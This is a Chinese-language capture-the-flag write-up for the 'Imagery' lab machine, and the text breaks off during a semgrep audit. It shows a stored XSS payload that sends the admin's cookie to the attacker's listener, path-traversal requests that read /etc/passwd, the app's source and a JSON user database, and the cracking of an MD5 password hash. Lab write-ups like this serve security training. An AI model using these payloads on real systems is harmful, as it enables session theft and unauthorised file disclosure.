## Imagery
```
[★]$ nmap -sV -sC 10.129.242.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-27 00:27 CST
Nmap scan report for 10.129.242.164
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
```
#### 在扫描的时候没有发现域名，打开网页8000端口可以找寻相关域名
```
[★]$ echo '10.129.242.164 imagery.htb' | sudo tee -a /etc/hosts
```
#### 注册登录后，点击地下的的Report Bug
### [1]第一次在Report a Bug输入：
```
<img src="http://10.10.15.132:8000/XSS_NAME"></img>

<img src="http://10.10.15.132:8000/XSS_DESC"></img>
```
#### 使用nc侦听,使用8000端口，不使用$ python3 -m http.server 8000
```
[★]$ nc -lvnp 8000
listening on [any] 8000 ...

//需要输入如下，nc才能侦听到反弹
[★]$ curl http://10.129.242.164:8000/ -s | grep function

[★]$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.242.164] 44538
GET /XSS_DESC HTTP/1.1
Host: 10.10.15.132:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
#### 发现信息函数 async function loadBugReports() { 
```
[★]$ curl http://10.129.242.164:8000/ -s | grep function
        function showMessage(message, type = 'info') {
        function showMessageOnce(message, type = 'info', uniqueId = '') {
        async function navigateTo(pageId) {
        async function checkAuthStatus(updateUI = true) {
        function updateFooterLinks() {
        function updateUIBasedOnAuth() {
        async function registerUser(event) {
        async function loginUser(event) {
        async function logoutUser() {
        async function loadGalleryImages() {
        function toggleAccordion(contentId) {
        function toggleImageMenu(event, imageId) {
        function closeAllImageMenus(event) {
        function showConfirmationModal(message, onConfirm, confirmText = 'Confirm', cancelText = 'Cancel', type = 'info') {
        function hideConfirmationModal() {
        function showDeleteConfirmation(imageId, imageType) {
        async function deleteImageConfirmed(imageId, deleteAllDerived) {
        function handleEditImage(imageId) {
        async function editImageDetails() {
        function hideEditModal() {
        function updateConversionFormatOptions(currentMimeType) {
        function handleConvertImage(imageId) {
        async function executeConversion() {
        function hideConversionModal() {
        function handleVisualTransformImage(imageId) {
        function drawCanvas() {
        function getMousePos(event) {
        function getCanvasToImageScale() {
        function isPointInHandle(x, y, handle) {
        function canvasMouseDown(e) {
        function canvasMouseMove(e) {
        function canvasMouseUp() {
        function updateCropInputs() {
        function updateVisualTransformParamsVisibility() {
        async function executeVisualTransform() {
        function hideVisualTransformModal() {
        async function handleMetadataDeletion(imageId) {
        function setUploadMode(mode) {
        async function uploadImage(event) {
        async function submitBugReport(event) {
        async function loadBugReports() { //这里
        function showDeleteBugReportConfirmation(reportId) {
        async function deleteBugReport(reportIdToDelete) {
        async function loadUsersForAdminPanelDisplay(users) {
        function handleDownloadUserLog(username) {
        function showDeleteUserConfirmation(username) {
        async function deleteUser(usernameToDelete) {
        async function loadAdminPanelContent() {
        function togglePasswordVisibility(passwordInputId) {
        async function populateImageGroupDropdown() {
        async function createNewGroup() {
        async function moveSelectedImagesToGroup() {
        function showManageGroupsModal() {
        function hideManageGroupsModal() {
```
#### Google搜索：0xdf 404 templates
https://0xdf.gitlab.io/cheatsheets/404
#### 本靶机的404：
```
Not Found

The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```
#### 404对应为Flask是一个用Python编写的轻量级Web框架，它设计简洁，便于快速开发Web应用程序。
```
Flask
Flask is a Python web framework. The default 404 page looks like:
```
#### 在Fn12 -> Storage里有session
```
[★]$ pip3 install flask-unsign
[★]$ flask-unsign -d -c .eJxNjTEOgzAMRe_iuaragSUTHXuKyBAnWCIGxWaIEHeHDEUd33tf-jsE1nXG-g3goKP4imF4wwNYPyGzgIs4KzX2nFcquggaS_JGaptS-V_8nMdxXDaxuzUpmOn60IqFKvacMVGpz8kGOE7RtDFU.aaPpmw.Ews05hd6hyK5vDBa6ygehufOxKA
{'displayId': '5ef0fdb1', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'syareya@imagery.htb'}
```
#### flask-unsign是用来解析Flask应用的签名cookie的；-d可读;-c解析
#### 下载一个普通的 JPG 图片文件
```
[★]$ find /usr -name *.jpg
[★]$ cp /usr/share/caja/patterns/gnome.jpg .
```
#### 上传这个文件在Upload New Image ,发现图片的主要功能无法点击
```
Edit Details
Convert Format
Transform Image
Delete Metadata
Download //可以点击
Delete   //可以点击
```
#### 点击Download，验证图片的值是一样的
```
[★]$ md5sum 980738ad-3807-4995-9fad-08d290dcaf8d_gnome.jpg gnome.jpg
28aab0de5e17bbb78a027551d46ee984  980738ad-3807-4995-9fad-08d290dcaf8d_gnome.jpg
28aab0de5e17bbb78a027551d46ee984  gnome.jpg
```
#### 查看网站源代码,关键词loadBugReports，发现信息 ${report.details}
```
async function loadBugReports() {
            const bugReportsList = document.getElementById('bug-reports-list');
            const noBugReports = document.getElementById('no-bug-reports');

            if (!bugReportsList || !noBugReports) {
                console.error("Error: Admin panel bug report elements not found.");
                return;
            }

            bugReportsList.innerHTML = '';
            noBugReports.style.display = 'none';

            try {
                const response = await fetch(`${window.location.origin}/admin/bug_reports`); //这里指向admin
                const data = await response.json();

                if (data.success) {
                    if (data.bug_reports.length === 0) {
                        noBugReports.style.display = 'block';
                    } else {
                        data.bug_reports.forEach(report => {
                            const reportCard = document.createElement('div');
                            reportCard.className = 'bg-white p-6 rounded-xl shadow-md border-l-4 border-purple-500 flex justify-between items-center';
                            
                            reportCard.innerHTML = `
                                <div>
                                    <p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
                                    <p class="text-sm text-gray-500 mb-2">Submitted by: ${DOMPurify.sanitize(report.reporter)} (ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}</p>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
                                    <div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
                                        ${report.details}  //这里
                                    </div>
                                </div>
                                <button onclick="showDeleteBugReportConfirmation('${DOMPurify.sanitize(report.id)}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-200 ml-4">
                                    Delete
                                </button>
                            `;
                            bugReportsList.appendChild(reportCard);
                        });
                    }
                } else {
                    showMessage(data.message, 'error');
                }
            } catch (error) {
                console.error('Error loading bug reports:', error);
                showMessage('Failed to load bug reports. Please try again later.', 'error');
            }
        }
```
#### 这是一个非常典型、而且危险的「存储型 XSS（Stored XSS）」漏洞点，而且触发对象是 admin
#### 关键事实：report.details 没有经过 DOMPurify.sanitize()
#### 但它被 直接拼进了 innerHTML，而其他字段（id / reporter / name）全部都被 sanitize 了
#### XSS 是 Cross-Site Scripting（跨站脚本攻击）
#### 另外一个信息await fetch(`${window.location.origin}/admin/bug_reports`); 
#### //fetch 是浏览器里的函数，用来：向服务器发 HTTP 请求，拿数据回来
#### 然后去浏览器的http:// 10.129.242.164:8000/admin/bug_reports
```	
message	"Access denied. Administrator privileges required."
success	false
```
#### 
```
[★]$ curl http://10.129.242.164:8000/ -s | grep fetch|awk -F\` '{print$2}'
${window.location.origin}/auth_status?_t=${new Date().getTime()}
${window.location.origin}/register
${window.location.origin}/login
${window.location.origin}/logout
${window.location.origin}/images
${window.location.origin}/delete_image
${window.location.origin}/edit_image_details
${window.location.origin}/convert_image
${window.location.origin}/apply_visual_transform
${window.location.origin}/delete_image_metadata
${window.location.origin}${endpoint}
${window.location.origin}/report_bug
${window.location.origin}/admin/bug_reports
${window.location.origin}/admin/delete_bug_report
${window.location.origin}/admin/delete_user
${window.location.origin}/admin/users
${window.location.origin}/get_image_collections
${window.location.origin}/create_image_collection
${window.location.origin}/move_images_to_collection
```
#### 浏览页搜索： https:// ippsec.rocks 搜索关键词：csrf //好像没结果
#### CSRF 是 Cross-Site Request Forgery（跨站请求伪造） 的缩写
```
这些接口有一个共同点：
👉 大量“会改数据的操作”
delete_user
delete_image
edit_image_details
move_images_to_collection
这类接口如果：
❌ 没有 CSRF Token
❌ 只靠 cookie 判断身份
那就满足了 CSRF 的利用前提。
```
### [2]第二次在网站上Report a Bug输入：
```
text

<img src=x onerror='fetch("http://10.10.15.132:8000/?"+btoa(document.cookie))'></img>
```
#### 需要俩个步骤才能把sdmin的cookie拿到，同上，nc 8000端口需要反弹
#### 侦听8000端口
```
[★]$ nc -lvnp 8000
listening on [any] 8000 ...
```
#### 反弹命令换另外一个端口
```
[★]$ nc -lvnp 8011
listening on [any] 8011 ...
```
#### 在浏览器上Fn12 的控制端console输入:
```
fetch("http://10.10.15.132:8011/?"+btoa(document.cookie))
Promise { <state>: "pending" }
```
#### 侦听收到
```
[★]$ nc -lvnp 8011
listening on [any] 8011 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.13.194] 36736
GET /?c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFhVXlxQS5Ld1JPc1lvamZlMXdVcE5rVk5XNGdDZXhmVWM= HTTP/1.1
Host: 10.10.15.132:8011
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: http://0.0.0.0:8000
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
#### 接着是8000端口
```
[★]$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.15.132] from (UNKNOWN) [10.129.13.194] 60448
GET /?c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFhVXlxQS5Ld1JPc1lvamZlMXdVcE5rVk5XNGdDZXhmVWM= HTTP/1.1
Host: 10.10.15.132:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.0.0 Safari/537.36
Accept: */*
Origin: http://0.0.0.0:8000
Referer: http://0.0.0.0:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```
#### document.cookie 这是浏览器里的一个变量，表示：当前网站的 Cookie 内容
#### btoa(...) btoa 的作用是：把字符串做 Base64 编码
```
[★]$ echo c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFhVXlxQS5Ld1JPc1lvamZlMXdVcE5rVk5XNGdDZXhmVWM= | base64 -d
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc
```
#### 得到的是admin用户信息
```
[★]$ flask-unsign -d -c .eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc
{'displayId': 'a1b2c3d4', 'isAdmin': True, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'admin@imagery.htb'}
```
#### 在浏览器上Fn12 的Storge插入cookie,刷新就可以网页上的'Admin Panel'
### 为什么这个nc侦听需要输入命令才能反弹呢？
#### 这个 nc 监听之所以需要先触发访问行为才会收到连接，是因为这是一次：
#### 由存储型 XSS（Stored XSS）触发的客户端出站请求（client-side outbound request），而不是服务端主动连接（server-initiated connection）
——————————————————————————
### 在'Admin Panel'下载Download Log 
#### 启用burpsuite
```
GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log HTTP/1.1
Host: 10.129.13.194:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.13.194:8000/
DNT: 1
Connection: keep-alive
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc; {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```
#### Ctrl+R,Shift+Ctrl+R,开始测试
```
GET /admin/get_system_log?log_identifier=../../../../../../../../../../etc/passwd HTTP/1.1

//Send

HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Mon, 02 Mar 2026 07:26:51 GMT
Content-Disposition: attachment; filename=passwd
Content-Type: text/plain; charset=utf-8
Content-Length: 1982
Last-Modified: Mon, 22 Sep 2025 19:11:49 GMT
Cache-Control: no-cache
ETag: "1758568309.7066295-1982-2832208693"
Date: Mon, 02 Mar 2026 07:26:51 GMT
Vary: Cookie
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105:://uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```
#### /proc/self/environ 是当前进程（也就是 Web 服务进程本身）的环境变量（environment variables）文件视图
```
GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/environ HTTP/1.1

//Send

HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Mon, 02 Mar 2026 07:25:41 GMT
Content-Disposition: attachment; filename=environ
Content-Type: text/plain; charset=utf-8
Content-Length: 0
Last-Modified: Mon, 02 Mar 2026 07:25:41 GMT
Cache-Control: no-cache
ETag: "1772436341.687206-0-969807349"
Date: Mon, 02 Mar 2026 07:25:41 GMT
Vary: Cookie
Connection: close

LANG=en_US.UTF-8
```
#### 仅泄露了 LANG=en_US.UTF-8，说明当前进程环境变量被限制或未包含敏感配置。
#### 因为在你已经确认 存在 LFI（本地文件包含） 且能读到/proc/self/environ 之后，下一步的专业目标就变成了：
#### 定位并读取 Web 应用的源代码（尤其是主入口文件）
#### /proc/self/cwd 是一个符号链接，指向当前进程启动时所在的目录（也就是 Web 应用运行目录）
```
GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/app.py HTTP/1.1

//Send

HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Mon, 02 Mar 2026 07:33:52 GMT
Content-Disposition: attachment; filename=app.py
Content-Type: text/plain; charset=utf-8
Content-Length: 1943
Last-Modified: Tue, 05 Aug 2025 15:21:25 GMT
Cache-Control: no-cache
ETag: "1754407285.0-1943-2068715193"
Date: Mon, 02 Mar 2026 07:33:52 GMT
Vary: Cookie
Connection: close

from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)

//1. SESSION_COOKIE_HTTPONLY = False --说明：Cookie 可以被 JS 读取
//2. secret_key = os.urandom(24).hex()    --Secret Key 是随机生成的
//3. 导入了很多模块 --意味着：下一步目标不是 app.py 本身
//from config import *
//from api_admin import bp_admin
//而是：config.py;api_admin.py;utils.py
```
#### 为什么优先读 app.py？Source Code Disclosure via LFI
```
因为 app.py 通常是：
✅ Flask 主入口文件
✅ 包含：
路由
认证逻辑
密钥来源
蓝图注册
配置加载位置
属于：高价值目标文件（High-Value Target）
```
____________________
### app.py 是 Python Web 项目的默认入口名
```
[★]$ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc";do echo ${fn};done
config
app
api_auth
utils
api_upload
api_manage
api_admin
api_misc
```
#### for fn in ...; do ...; done //这是一个 bash 循环：
```
for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc";do curl --path-as-is -s -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc' http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/${fn}.py;done
```
#### curl --path-as-is：告诉 curl：不要帮我自动规范化路径（不要把 ../ 合并掉）
#### -s = --silent//不显示进度条、错误信息
#### -b session=...//给请求带上 Cookie
#### LFI（本地文件包含） + procfs + cwd 跳转 目的：读取 Web 应用运行目录下的源码文件
#### 自动化成批量下载源码
```
[★]$ mkdir app
[★]$ cd app
[~/app][★]$ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc" "api_edit";do curl --path-as-is -s -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc' http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/${fn}.py -o ${fn}.py ;done
[~/app][★]$ ls
api_admin.py  api_auth.py  api_edit.py  api_manage.py  api_misc.py  api_upload.py  app.py  config.py  utils.py
```
```
[★]$ cat utils.py | grep password
def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

[★]$ cat config.py |  grep db
DATA_STORE_PATH = 'db.json'
```
#### 1.能用 LFI 读应用目录下的任意文件
#### 2.已经拿到了 应用源码（app.py / utils.py / config.py …）
#### 3.而这个项目用的不是 MySQL / SQLite，而是一个：JSON 文件型数据库
#### 这其中utils.py并没有出现'db.json'
#### 在burpsuite
```
GET /admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/db.json

//Send

HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Mon, 02 Mar 2026 08:07:01 GMT
Content-Disposition: attachment; filename=db.json
Content-Type: text/plain; charset=utf-8
Content-Length: 975
Last-Modified: Mon, 02 Mar 2026 08:06:07 GMT
Cache-Control: no-cache
ETag: "1772438767.7193482-975-2446399247"
Date: Mon, 02 Mar 2026 08:07:01 GMT
Vary: Cookie
Connection: close

{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```
```
在这种 Flask / 轻量项目里，最常见几种是：
方式	典型文件
SQLite	db.sqlite3, database.db
JSON 存储	db.json, users.json, data.json
YAML	config.yaml
```
#### burpsuite右键点击‘Copy as curl command (bash)‘
#### 直接粘贴到terminal , 后面加个-o db.json 
```
[★]$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 10.129.13.194:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://10.129.13.194:8000/' -H $'DNT: 1' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' -H $'Priority: u=0, i' \
    -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc; {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value' \
    $'http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/db.json' -o db.json
```
```
[★]$ sed -n '/^{/,$p' db.json > db1.json
[~/app][★]$ jq . db1.json
{
  "users": [
    {
      "username": "admin@imagery.htb",
      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
      "isAdmin": true,
      "displayId": "a1b2c3d4",
      "login_attempts": 0,
      "isTestuser": false,
      "failed_login_attempts": 0,
      "locked_until": null
    },
    {
      "username": "testuser@imagery.htb",
      "password": "2c65c8d7bfbca32a3ed42596192384f6",
      "isAdmin": false,
      "displayId": "e5f6g7h8",
      "login_attempts": 0,
      "isTestuser": true,
      "failed_login_attempts": 0,
      "locked_until": null
    }
  ],
  "images": [],
  "image_collections": [
    {
      "name": "My Images"
    },
    {
      "name": "Unsorted"
    },
    {
      "name": "Converted"
    },
    {
      "name": "Transformed"
    }
  ],
  "bug_reports": []
}
```
#### 打开网页https://crackstation.net/
```
5d9c1d507a3f76af1e5c97a3ad1eaa31         Unknown	Not found.
2c65c8d7bfbca32a3ed42596192384f6 	 md5	        iambatman
```
#### 得到testuser@imagery.htb的密码为iambatman
#### 源码审计（static code analysis）
```
[~/app][★]$ grep system *.py
api_admin.py:@bp_admin.route('/admin/get_system_log', methods=['GET'])
api_admin.py:def get_system_log():
config.py:SYSTEM_LOG_FOLDER = 'system_logs'

[★]$ grep subprocess *.py
api_edit.py:import subprocess
api_edit.py:            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:    except subprocess.CalledProcessError as e:
api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:    except subprocess.CalledProcessError as e:
api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
api_edit.py:    except subprocess.CalledProcessError as e:

[~/app][★]$ grep subprocess *.py //空的原因可能存在任意文件读取（LFI / Path Traversal）

[~/app][★]$ [★]$ pip install semgrep //安装 opengrep / semgrep

[~/app][★]$ git clone https://github.com/returntocorp/semgrep-rules.git 

[~/app][★]$semgrep scan -f semgrep-rules/python/ .
<SNIP>
 api_edit.py
   ❯❯❱ semgrep-rules.python.flask.security.injection.subprocess-injection
          ❰❰ Blocking ❱❱
          Detected user input entering a `subprocess` call       
          unsafely. This could result in a command injection     
          vulnerability. An attacker could use this vulnerability
          to execute arbitrary commands on the host, which allows
          them to download malware, scan sensitive data, or run  
          any command they wish on the server. Do not let users  
          choose the command to run. In general, prefer to use   
          Python API versions of system commands. If you must use
          subprocess, use a dictionary to allowlist a set of     
          commands.                                              
                                                                 
           45┆ subprocess.run(command, capture_output=True,
               text=True, shell=True, check=True)          
   
   ❯❯❱ semgrep-rules.python.lang.security.audit.dangerous-subprocess-use-
       audit                                                             
          ❰❰ Blocking ❱❱
          Detected subprocess function 'run' without a static   
          string. If this data can be controlled by a malicious 
          actor, it may be an instance of command injection.    
          Audit the use of this call to ensure it is not        
          controllable by an external resource. You may consider
          using 'shlex.escape()'.                               
                                                                
           45┆ subprocess.run(command, capture_output=True,
               text=True, shell=True, check=True)          
   
   ❯❯❱ semgrep-rules.python.lang.security.dangerous-subprocess-use
          ❰❰ Blocking ❱❱
          Detected subprocess function 'run' with user controlled
          data. A malicious actor could leverage this to perform 
          command injection. You may consider using              
          'shlex.escape()'.                                      
                                                                 
